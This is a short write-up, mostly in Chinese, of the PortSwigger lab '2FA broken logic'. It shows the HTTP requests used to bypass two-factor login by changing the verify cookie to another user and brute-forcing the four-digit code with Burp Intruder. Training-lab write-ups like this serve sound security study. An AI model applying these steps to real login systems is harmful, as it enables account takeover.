[Write Up]Lab: 2FA broken logic

2024-12-02
#write-up  #portswigger 

Lab description#

Solution#

  1. 进入Lab页面后，点击右上角My account按钮后进入login页面
  2. 登录成功(url:/login)后的Response如下
HTTP/2 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
Set-Cookie: session=rId30xi0me3ux2SZjV4aidmumqu92pPv; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
  1. 登录成功后会跳转至/login2，并且对应的Request为
GET /login2 HTTP/2
Host: 0a80005c0389890681083af800d600a9.web-security-academy.net
Cookie: session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=wiener
  1. 修改Request的verify参数为carlos，并发送Request
GET /login2 HTTP/2
Host: 0a80005c0389890681083af800d600a9.web-security-academy.net
Cookie: session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=carlos
  1. 对应的Response为
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3012
  1. 回到页面输入security code后失败，将对应的Request发送至Intruder，修改verify为carlos，参数配置如下
POST /login2 HTTP/2
Host: 0a80005c0389890681083af800d600a9.web-security-academy.net
Cookie: session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=carlos

mfa-code=§1111§

6. 根据爆破的Length排列，security code为0448，将此结果通过Request in browser -> In original session返回页面 7. 成功登录carlos
